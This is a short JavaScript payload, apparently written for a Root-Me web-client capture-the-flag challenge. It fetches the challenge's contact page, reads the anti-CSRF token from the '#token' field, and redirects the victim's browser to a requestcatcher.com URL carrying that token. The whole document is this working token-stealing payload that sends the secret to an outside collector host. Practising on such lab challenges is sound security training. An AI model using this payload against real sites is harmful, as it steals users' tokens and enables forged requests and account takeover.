fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact')
  .then(response => {
    
    return response.text()
  })
  .then(html => {
    const parser = new DOMParser()

    const doc = parser.parseFromString(html, "text/html")

    const token = doc.querySelector('#token').value

    window.location.href = `https://yt54h.requestcatcher.com/${token}`
  })
  .catch(error => {
     console.error('Failed to fetch page')
  })
